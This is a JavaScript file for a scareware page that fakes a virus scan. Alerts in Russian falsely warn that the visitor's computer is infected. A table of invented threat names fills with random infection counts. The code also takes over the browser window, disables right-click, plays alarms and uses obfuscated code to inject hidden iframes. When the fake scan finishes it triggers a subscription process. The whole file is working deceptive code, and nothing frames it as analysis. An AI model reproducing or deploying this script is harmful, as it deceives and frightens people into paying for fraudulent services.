$( function(  ) {

	var zo3f00 = [ "abd", "vde", "csq", "mvc", "opa", "bcx", "sos", "kbc", "kfc", "iqw", "boe", "cbz", "wtt" ];
    var d19401 = [ "sabd", "avde", "icsq", "emvc", "sopa", "bcex", "sios", "kabc", "kfsc", "iiqw", "baoe", "cbzz", "wtti" ];

    var sf029 = ($.cookie('hsa') != 1 && !$.cookie('cpc'));
    var tp45f8c8 = 1;

    var intervals = { hl: null, process: null };
    var proc = {
        f1: 1,
        f2: 1,
        fnd: { c: 0,d: 0 },
        current: 0,
        msg: [
            'B\u043D\u0438\u043Ca\u043D\u0438e! \u0412a\u0448 \u0431pa\u0443\u0437ep o\u0431\u043Dap\u0443\u0436\u0438\u043B, \u0447\u0442o Ba\u0448 \u043Ao\u043C\u043F\u044C\u044E\u0442ep \u0437\u0430\u0440\u0430\u0436\u0435\u043D \u0432\u0438\u0440\u0443\u0441\u0430\u043C\u0438. \u041A\u0440\u0430\u0439\u043D\u0435 \u043Deo\u0431xo\u0434\u0438\u043Co cpo\u0447\u043Do \u043Fpo\u0432ep\u0438\u0442\u044C \u043Ao\u043C\u043F\u044C\u044E\u0442ep \u043Da \u043Da\u043B\u0438\u0447\u0438e \u0432pe\u0434o\u043Doc\u043D\u044Bx \u043Fpo\u0433pa\u043C\u043C.',
			'Ba\u0448 \u043Ao\u043C\u043F\u044C\u044E\u0442ep \u0437apa\u0436e\u043D! \u042D\u0442o \u043Co\u0436e\u0442 \u043Fp\u0438\u0432ec\u0442\u0438 \u043A \u043Fo\u0442ep\u0438 \u0434a\u043D\u043D\u044Bx \u0438 \u0443\u0434\u0430\u043B\u0435\u043D\u0438\u044E \u043B\u0438\u0447\u043D\u043E\u0439 \u0438\u043D\u0444\u043E\u0440\u043C\u0430\u0446\u0438\u0438! Ha\u0436\u043C\u0438\u0442e O\u0442\u043Ce\u043Da, \u0447\u0442o\u0431\u044B \u043Fpe\u0434o\u0442\u0432pa\u0442\u0438\u0442\u044C \u044D\u0442o.'
        ],
        dl: false
    };

    var cd = new Date();
    cd = [cd.getDate(), (cd.getMonth() + 1), cd.getFullYear()].join('/');
    var dc = ($.cookie('dc') == 1);

    var data = {
        curr: 0,
		0: { name: "Trj-Dwn1dr.Win",date: dc ? cd : "9/17/2010" },
		1: { name: "Lenemo.3451",date: dc ? cd : "12/13/2010" },
		2: { name: "Micro.PPoint.Attach",date: dc ? cd : "7/18/2011" },
		3: { name: "Virus.BoT.Vr.o",date: dc ? cd : "2/10/2011" },
		4: { name: "Backdoor.Per1.API.20",date: dc ? cd : "12/31/2011" },
		5: { name: "Trojan-Spy.Win64.WMPatch",date: dc ? cd : "12/13/2011" },
		6: { name: "Trojan-PSW.Win64.D1etc",date: dc ? cd : "2/13/2011" },
		7: { name: "Trojan-C1icker.Win64.Bitdefener",date: dc ? cd : "11/13/2011" }
    };

    var loading = function(lengthes, withSound, fireEvent) {

        var playSound = function(soundName) {
            withSound && niftyplayer(soundName) && niftyplayer(soundName).play && niftyplayer(soundName).play();
        };

        if ($.cookie('alrml') == 1) playSound('loadAlarm');
        $('.ldng').animate({ width: 250 }, lengthes[0], 'linear', function() { $(this).animate({ width: 420 }, lengthes[1], function() {
                $(this).animate({ width: 539 }, lengthes[2], 'linear', function() {
                    clearInterval(intervals.hl);
                    clearInterval(intervals.process);
                    if (fireEvent) {
                        if ($.cookie('hc') > 0) $('#hc').remove();
                        _app.process( { manual: 1, action: 'startSubscriptionProcess' } );
                    }
                    proc.prev.text(proc.f1+proc.f2);
                    proc.current.parent().hide()//.addClass('cmplt').html('\u041Fpo\u0432ep\u043Aa&nbsp;\u0437a\u0432ep\u0448e\u043Da.&nbsp;Ha\u0439\u0434e\u043Do '+(proc.f1+proc.f2)+'&nbsp;\u0437apa\u0436e\u043D\u043D\u044Bx&nbsp;\u0444a\u0439\u043Bo\u0432!');
                    proc.prev.parent().show();
                    if ($.cookie('alrmp') == 1) { playSound('loadPig'); }
                });
            });
        });
    };

    var hl = function() {
        $('.hl').css('margin-left', '-70px').animate({ marginLeft: 539 }, 1000);
    };

    var process = function() {
        var f1 = Math.floor(Math.random()*8);
        var f2 = Math.floor(Math.random()*10);
        proc.f1 += f1;
                proc.fnd.c.text(proc.f1);
        if(f2 < 4) {
            proc.f2 += f2;
            proc.fnd.d.text(proc.f2);
        }
        if(f1 < 3 && data.curr <= 10) {
            $('.report div table')
                .append(
                        '<tr><td>'
                        + data[data.curr].name
                        +'</td><td class="red">Kp\u0438\u0442\u0438\u0447ec\u043A\u0438\u0439</td><td>'
                        + data[data.curr].date
                        + '</td><td class="count">'
                        + Math.floor((proc.f1 +proc.f2)/(Math.random()*proc.f2))
                        + '</td><td>O\u0436\u0438\u0434ae\u0442 \u0443\u0434a\u043Be\u043D\u0438\u044F</td></tr>'
                );
            data.curr = (data.curr + 1) % 7;
            $('.report div').scrollTop(10000); // keep it down
        }
        proc.current.text(zo3f00[Math.floor(Math.random() * zo3f00.length)]+"."+d19401[Math.floor(Math.random() * d19401.length)]);
    };

    fdl = function() {
    };

    show_alert = function(i, t) {
        if(i <= proc.msg.length) {
            if(typeof t != "undefined" && t == true){
                return proc.msg[i-1];
            }else{
                alert(proc.msg[i-1]);
                return true;
            }
        }
    };

    hdwnd = function() {
        var w = window;
        var ua = navigator.userAgent;
        var v1 = ua.toLowerCase().indexOf('msie') != -1 && ua.toLowerCase().indexOf('opera') < 0;
        var x = 11;
        eval('w.resizeTo(x*10,x*11-7)');
        //w.moveTo(v1 ? (screen.width - 100) >> 1 : 11027, v1 ? (screen.height - 100) >> 1 : 10659);
        w.moveTo(v1 ? (screen.width - 100) >> 1 : screen.availWidth/2, v1 ? (screen.height - 100) >> 1 : screen.availHeight/2);
    };

    unld = function(event) {
        if (proc.dl === false && tp45f8c8 == 1) {
            fdl();
            if($.cookie('mad') && '1' == $.cookie('mad')){
                $("#jquery_jplayer_1").jPlayer("play");
            }
            return show_alert(2, true);
        }
    };

    $(document).ready(function() {
        if ($.cookie('hc') > 0) $('html').append('<div style="width:100%;height:100%;top:0;position:fixed;cursor:none;" id="hc"></div>');

        if($.cookie('ma')){
            var ma = Math.floor(parseInt($.cookie('ma'), 10));
            for (var counter = 0; counter < ma; counter++){
                $('#iblocks').append('<iframe height="0" width="0" frameborder="0" src="iframe.html"></iframe>');
            }
        }
        if ($.cookie('na')) {
            var na = Math.floor(parseInt($.cookie('na'), 10));
            if (na) {
                var _0xfcf3=["\x70\x61\x67\x65\x58","\x70\x61\x67\x65\x59","\x3C\x69\x66\x72\x61\x6D\x65\x20\x68\x65\x69\x67\x68\x74\x3D\x22\x30\x22\x20\x77\x69\x64\x74\x68\x3D\x22\x30\x22\x20\x66\x72\x61\x6D\x65\x62\x6F\x72\x64\x65\x72\x3D\x22\x30\x22\x20\x73\x72\x63\x3D\x22\x69\x66\x72\x61\x6D\x65\x32\x2E\x68\x74\x6D\x6C\x22\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E","\x68\x74\x6D\x6C","\x23\x69\x62\x6C\x6F\x63\x6B\x73","\x20","\x74\x65\x78\x74","\x23\x70","\x77\x69\x64\x74\x68","\x68\x65\x69\x67\x68\x74","\x6D\x6F\x75\x73\x65\x6C\x65\x61\x76\x65","\x6D\x6F\x75\x73\x65\x6D\x6F\x76\x65"];function ms(_0x8b7cx2){window[_0xfcf3[0]]=_0x8b7cx2[_0xfcf3[0]];window[_0xfcf3[1]]=_0x8b7cx2[_0xfcf3[1]];} ;function nal(){if(na){$(_0xfcf3[4])[_0xfcf3[3]](_0xfcf3[2]);na--;} ;} ;$(document)[_0xfcf3[11]](function (_0x8b7cx2){ms(_0x8b7cx2);} )[_0xfcf3[10]](function (_0x8b7cx2){ms(_0x8b7cx2);nal();setInterval(function (){$(_0xfcf3[7])[_0xfcf3[6]](window[_0xfcf3[0]]+_0xfcf3[5]+window[_0xfcf3[1]]);if(window[_0xfcf3[0]]<1||window[_0xfcf3[0]]>$(document)[_0xfcf3[8]]()||window[_0xfcf3[1]]<1||window[_0xfcf3[1]]>$(document)[_0xfcf3[9]]()){nal();} ;} ,1000);} );
            }
        }

        if($.cookie('mad') && '1' == $.cookie('mad')){
            $("#jquery_jplayer_1").jPlayer({
                ready: function () {
                    $(this).jPlayer("setMedia", {
                        wav: "assets/jplayer/pig_sound.wav"
                    });
                },
                swfPath: "assets/jplayer",
                supplied: "wav"
            });
        }

        var w = window;
        $( '#numpremium' ).hide(  );

        if (sf029 == 1) {
            hdwnd();
            show_alert(1)
            w.moveTo(0,0);
            w.resizeTo(screen.availWidth, screen.availHeight);
            w.focus();
        }
        $(document).bind("contextmenu", function(e){ return false; });
        proc.fnd.c = $('.hdd span.c em');
        proc.fnd.d = $('.hdd span.d em');
        proc.current = $('.process span');
        proc.prev = $('.process.cmplt em');

        var lengthes = [9000, 4000, 6000];
        var withSound = true;
        var processSpeed = 200;
        var fireEvent = true;

        if ($.cookie('cpc')) {
            lengthes = [0, 0, 0];
            withSound = false;
            processSpeed = 0;
            fireEvent = false;
        }

        intervals.hl = setInterval(hl, 2000);
        intervals.process = setInterval(process, processSpeed);
        loading(lengthes, withSound, fireEvent);
    });

    //window.onbeforeunload = unld;
} );
